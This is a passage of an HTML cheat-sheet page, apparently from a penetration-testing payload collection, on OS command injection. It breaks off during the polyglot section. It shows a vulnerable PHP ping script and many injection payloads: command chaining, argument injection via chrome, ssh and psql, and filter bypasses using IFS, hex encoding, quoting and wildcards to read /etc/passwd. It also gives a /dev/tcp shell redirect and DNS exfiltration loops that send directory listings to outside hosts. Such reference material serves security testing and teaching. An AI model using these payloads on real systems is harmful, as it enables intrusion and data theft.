      <a href="../directory-travseral/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Directory Traversal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_5" >
        
          
          <label class="md-nav__link" for="__nav_9_5" id="__nav_9_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    File inclusion
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_5">
            <span class="md-nav__icon md-icon"></span>
            File inclusion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file-inclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Inclusion
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_6" >
        
          
          <label class="md-nav__link" for="__nav_9_6" id="__nav_9_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    File upload
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_6">
            <span class="md-nav__icon md-icon"></span>
            File upload
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file-upload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="command-injection">Command Injection</h1>
<blockquote>
<p>Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#tools">Tools</a></li>
<li><a href="#exploits">Exploits</a></li>
<li><a href="#basic-commands">Basic commands</a></li>
<li><a href="#chaining-commands">Chaining commands</a></li>
<li><a href="#argument-injection">Argument injection</a></li>
<li><a href="#inside-a-command">Inside a command</a></li>
<li><a href="#filter-bypasses">Filter Bypasses</a></li>
<li><a href="#bypass-without-space">Bypass without space</a></li>
<li><a href="#bypass-with-a-line-return">Bypass with a line return</a></li>
<li><a href="#bypass-with-backslash-newline">Bypass with backslash newline</a></li>
<li><a href="#bypass-characters-filter-via-hex-encoding">Bypass characters filter via hex encoding</a></li>
<li><a href="#bypass-blacklisted-words">Bypass blacklisted words</a></li>
<li><a href="#bypass-with-single-quote">Bypass with single quote</a></li>
<li><a href="#bypass-with-double-quote">Bypass with double quote</a></li>
<li><a href="#bypass-with-backslash-and-slash">Bypass with backslash and slash</a></li>
<li><a href="#bypass-with-">Bypass with $@</a></li>
<li><a href="#bypass-with--1">Bypass with $()</a></li>
<li><a href="#bypass-with-variable-expansion">Bypass with variable expansion</a></li>
<li><a href="#bypass-with-wildcards">Bypass with wildcards</a></li>
<li><a href="#data-exfiltration">Data Exfiltration</a></li>
<li><a href="#time-based-data-exfiltration">Time based data exfiltration</a></li>
<li><a href="#dns-based-data-exfiltration">DNS based data exfiltration</a></li>
<li><a href="#polyglot-command-injection">Polyglot Command Injection</a></li>
<li><a href="#tricks">Tricks</a></li>
<li><a href="#backgrounding-long-running-commands">Backgrounding long running commands</a></li>
<li><a href="#remove-arguments-after-the-injection">Remove arguments after the injection</a></li>
<li><a href="#labs">Labs</a></li>
<li><a href="#challenge">Challenge</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="tools">Tools</h2>
<ul>
<li><a href="https://github.com/commixproject/commix">commixproject/commix</a> - Automated All-in-One OS command injection and exploitation tool</li>
<li><a href="https://github.com/projectdiscovery/interactsh">projectdiscovery/interactsh</a> - An OOB interaction gathering server and client library</li>
</ul>
<h2 id="exploits">Exploits</h2>
<p>Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.</p>
<p>The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.</p>
<p><strong>Example of Command Injection with PHP</strong>:  <br />
Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 4 &quot;</span> <span class="o">.</span> <span class="nv">$ip</span><span class="p">);</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>In the above code, the PHP script uses the <code>system()</code> function to execute the <code>ping</code> command with the IP address or domain provided by the user through the <code>ip</code> GET parameter.</p>
<p>If an attacker provides input like <code>8.8.8.8; cat /etc/passwd</code>, the actual command that gets executed would be: <code>ping -c 4 8.8.8.8; cat /etc/passwd</code>.</p>
<p>This means the system would first <code>ping 8.8.8.8</code> and then execute the <code>cat /etc/passwd</code> command, which would display the contents of the <code>/etc/passwd</code> file, potentially revealing sensitive information.</p>
<h3 id="basic-commands">Basic commands</h3>
<p>Execute the command and voila :p</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="n">0</span><span class="p">:</span><span class="n">0</span><span class="p">:</span><span class="n">root</span><span class="p">:/</span><span class="n">root</span><span class="p">:/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="n">1</span><span class="p">:</span><span class="n">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:/</span><span class="n">usr</span><span class="p">/</span><span class="n">sbin</span><span class="p">:/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="n">2</span><span class="p">:</span><span class="n">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:/</span><span class="n">bin</span><span class="p">:/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="n">3</span><span class="p">:</span><span class="n">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:/</span><span class="n">dev</span><span class="p">:/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">...</span>
</code></pre></div>
<h3 id="chaining-commands">Chaining commands</h3>
<p>In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. </p>
<ul>
<li><code>;</code> (Semicolon): Allows you to execute multiple commands sequentially.</li>
<li><code>&amp;&amp;</code> (AND): Execute the second command only if the first command succeeds (returns a zero exit status).</li>
<li><code>||</code> (OR): Execute the second command only if the first command fails (returns a non-zero exit status).</li>
<li><code>&amp;</code> (Background): Execute the command in the background, allowing the user to continue using the shell.</li>
<li><code>|</code> (Pipe):  Takes the output of the first command and uses it as the input for the second command.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">command1</span><span class="p">;</span> <span class="n">command2</span>   <span class="c"># Execute command1 and then command2</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">command1</span> <span class="p">&amp;&amp;</span> <span class="n">command2</span> <span class="c"># Execute command2 only if command1 succeeds</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">command1</span> <span class="p">||</span> <span class="n">command2</span> <span class="c"># Execute command2 only if command1 fails</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">command1</span> <span class="p">&amp;</span> <span class="n">command2</span>  <span class="c"># Execute command1 in the background</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">command1</span> <span class="p">|</span> <span class="n">command2</span>  <span class="c"># Pipe the output of command1 into command2</span>
</code></pre></div>
<h3 id="argument-injection">Argument Injection</h3>
<p>Gain a command execution when you can only append arguments to an existing command.
Use this website <a href="https://sonarsource.github.io/argument-injection-vectors/">Argument Injection Vectors - Sonar</a> to find the argument to inject to gain command execution.</p>
<ul>
<li>
<p>Chrome
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">chrome</span> <span class="s1">&#39;--gpu-launcher=&quot;id&gt;/tmp/foo&quot;&#39;</span>
</code></pre></div></p>
</li>
<li>
<p>SSH
    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">ssh</span> <span class="s1">&#39;-oProxyCommand=&quot;touch /tmp/foo&quot;&#39;</span> <span class="n">foo</span><span class="nv">@foo</span>
</code></pre></div></p>
</li>
<li>
<p>psql
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">psql</span> <span class="n">-o</span><span class="s1">&#39;|id&gt;/tmp/foo&#39;</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="inside-a-command">Inside a command</h3>
<ul>
<li>Command injection using backticks. 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>original_cmd_by_server<span class="w"> </span><span class="sb">`</span>cat<span class="w"> </span>/etc/passwd<span class="sb">`</span>
</code></pre></div></li>
<li>Command injection using substitution
  <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>original_cmd_by_server<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/etc/passwd<span class="k">)</span>
</code></pre></div></li>
</ul>
<h2 id="filter-bypasses">Filter Bypasses</h2>
<h3 id="bypass-without-space">Bypass without space</h3>
<ul>
<li><code>$IFS</code> is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret <code>$IFS</code> as a space. <code>$IFS</code> does not directly work as a seperator in commands like <code>ls</code>, <code>wget</code>; use <code>${IFS}</code> instead. 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">cat</span><span class="p">${</span><span class="n">IFS</span><span class="p">}/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">ls</span><span class="p">${</span><span class="n">IFS</span><span class="p">}</span><span class="n">-la</span>
</code></pre></div></li>
<li>In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span><span class="n">cat</span><span class="p">,/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span><span class="p">}</span>
</code></pre></div></li>
<li>Input redirection. The &lt; character tells the shell to read the contents of the file specified. 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">cat</span><span class="p">&lt;/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">sh</span><span class="p">&lt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">tcp</span><span class="p">/</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">/</span><span class="n">4242</span>
</code></pre></div></li>
<li>ANSI-C Quoting 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">X</span><span class="p">=$</span><span class="s1">&#39;uname\x20-a&#39;</span><span class="p">&amp;&amp;</span><span class="nv">$X</span>
</code></pre></div></li>
<li>The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value <code>09</code>.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">;</span><span class="n">ls</span><span class="k">%</span><span class="n">09-al</span><span class="k">%</span><span class="n">09</span><span class="p">/</span><span class="n">home</span>
</code></pre></div></li>
<li>In Windows, <code>%VARIABLE:~start,length%</code> is a syntax used for substring operations on environment variables.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">ping</span><span class="k">%</span><span class="n">CommonProgramFiles</span><span class="p">:~</span><span class="n">10</span><span class="p">,-</span><span class="n">18</span><span class="k">%</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">ping</span><span class="k">%</span><span class="n">PROGRAMFILES</span><span class="p">:~</span><span class="n">10</span><span class="p">,-</span><span class="n">5</span><span class="k">%</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>
</code></pre></div></li>
</ul>
<h3 id="bypass-with-a-line-return">Bypass with a line return</h3>
<p>Commands can also be run in sequence with newlines</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>original_cmd_by_server
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ls
</code></pre></div>
<h3 id="bypass-with-backslash-newline">Bypass with backslash newline</h3>
<ul>
<li>Commands can be broken into parts by using backslash followed by a newline
  <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">et</span><span class="p">\</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">c</span><span class="p">/</span><span class="n">pa</span><span class="p">\</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">sswd</span>
</code></pre></div></li>
<li>URL encoded form would look like this:
  <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">cat</span><span class="k">%</span><span class="n">20</span><span class="p">/</span><span class="n">et</span><span class="k">%</span><span class="n">5C</span><span class="k">%</span><span class="n">0Ac</span><span class="p">/</span><span class="n">pa</span><span class="k">%</span><span class="n">5C</span><span class="k">%</span><span class="n">0Asswd</span>
</code></pre></div></li>
</ul>
<h3 id="bypass-characters-filter-via-hex-encoding">Bypass characters filter via hex encoding</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>kali@kali:~$ echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>/etc/passwd
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>kali@kali:~$ cat `echo -e &quot;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;`
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>root:x:0:0:root:/root:/bin/bash
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>kali@kali:~$ abc=$&#39;\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39;;cat $abc
<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>root:x:0:0:root:/root:/bin/bash
<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>kali@kali:~$ `echo $&#39;cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39;`
<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>root:x:0:0:root:/root:/bin/bash
<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>kali@kali:~$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764
<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>/etc/passwd
<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>
<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>kali@kali:~$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`
<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>root:x:0:0:root:/root:/bin/bash
<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>
<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>kali@kali:~$ xxd -r -ps &lt;(echo 2f6574632f706173737764)
<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>/etc/passwd
<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>kali@kali:~$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`
<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>root:x:0:0:root:/root:/bin/bash
</code></pre></div>
<h3 id="bypass-characters-filter">Bypass characters filter</h3>
<p>Commands execution without backslash and slash - linux bash</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>kali@kali:~$ echo ${HOME:0:1}
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>/
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>kali@kali:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>root:x:0:0:root:/root:/bin/bash
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>kali@kali:~$ echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>/
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>kali@kali:~$ tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>/
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>kali@kali:~$ cat $(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)etc$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)passwd
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>root:x:0:0:root:/root:/bin/bash
</code></pre></div>
<h3 id="bypass-blacklisted-words">Bypass Blacklisted words</h3>
<h4 id="bypass-with-single-quote">Bypass with single quote</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>w&#39;h&#39;o&#39;am&#39;i
</code></pre></div>
<h4 id="bypass-with-double-quote">Bypass with double quote</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>w&quot;h&quot;o&quot;am&quot;i
</code></pre></div>
<h4 id="bypass-with-backslash-and-slash">Bypass with backslash and slash</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>w\ho\am\i
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>/\b\i\n/////s\h
</code></pre></div>
<h4 id="bypass-with">Bypass with $@</h4>
<p><code>$0</code>: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, <code>$0</code> will typically give the name of the shell.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>who$@ami
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>echo whoami|$0
</code></pre></div>
<h4 id="bypass-with_1">Bypass with $()</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>who$()ami
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>who$(echo am)i
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>who`echo am`i
</code></pre></div>
<h4 id="bypass-with-variable-expansion">Bypass with variable expansion</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/???/??t /???/p??s??
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>test=/ehhh/hmtc/pahhh/hmsswd
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>cat ${test//hhh\/hm/}
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>cat ${test//hh??hm/}
</code></pre></div>
<h4 id="bypass-with-wildcards">Bypass with wildcards</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">powershell</span> <span class="n">C</span><span class="p">:\*\*</span><span class="n">2</span><span class="p">\</span><span class="n">n</span><span class="p">?</span><span class="k">?</span><span class="n">e</span><span class="p">*</span><span class="n">d</span><span class="p">.*?</span> <span class="c"># notepad</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="p">@^</span><span class="n">p</span><span class="p">^</span><span class="n">o</span><span class="p">^</span><span class="n">w</span><span class="p">^</span><span class="n">e</span><span class="p">^</span><span class="n">r</span><span class="p">^</span><span class="n">shell</span> <span class="n">c</span><span class="p">:\*\*</span><span class="n">32</span><span class="p">\</span><span class="n">c</span><span class="p">*</span><span class="k">?</span><span class="n">c</span><span class="p">.</span><span class="n">e</span><span class="k">?</span><span class="n">e</span> <span class="c"># calc</span>
</code></pre></div>
<h2 id="data-exfiltration">Data Exfiltration</h2>
<h3 id="time-based-data-exfiltration">Time based data exfiltration</h3>
<p>Extracting data : char by char</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>kali@kali:~$<span class="w"> </span><span class="nb">time</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="k">$(</span>whoami<span class="p">|</span>cut<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="k">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>s<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>real<span class="w">    </span>0m5.007s
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>user<span class="w">    </span>0m0.000s
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>sys<span class="w"> </span>0m0.000s
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>kali@kali:~$<span class="w"> </span><span class="nb">time</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="k">$(</span>whoami<span class="p">|</span>cut<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="k">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>a<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">5</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>real<span class="w">    </span>0m0.002s
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>user<span class="w">    </span>0m0.000s
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>sys<span class="w"> </span>0m0.000s
</code></pre></div>
<h3 id="dns-based-data-exfiltration">DNS based data exfiltration</h3>
<p>Based on the tool from <code>https://github.com/HoLyVieR/dnsbin</code> also hosted at dnsbin.zhack.ca</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="m">1</span>.<span class="w"> </span>Go<span class="w"> </span>to<span class="w"> </span>http://dnsbin.zhack.ca/
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="m">2</span>.<span class="w"> </span>Execute<span class="w"> </span>a<span class="w"> </span>simple<span class="w"> </span><span class="s1">&#39;ls&#39;</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>/<span class="k">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$i</span><span class="s2">.3a43c7e4e57a8d0e2057.d.zhack.ca&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>$(host $(wget -h|head -n1|sed &#39;s/[ ,]/-/g&#39;|tr -d &#39;.&#39;).sudo.co.il)
</code></pre></div>
<p>Online tools to check for DNS based data exfiltration:</p>
<ul>
<li>dnsbin.zhack.ca</li>
<li>pingb.in</li>
</ul>
<h2 id="polyglot-command-injection">Polyglot Command Injection</h2>
<p>A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.</p>
<ul>
<li>Example 1:
  <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>Payload: 1;sleep${IFS}9;#${IFS}&#39;;sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a># Context inside commands with single and double quote:
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>echo 1;sleep${IFS}9;#${IFS}&#39;;sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>echo &#39;1;sleep${IFS}9;#${IFS}&#39;;sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
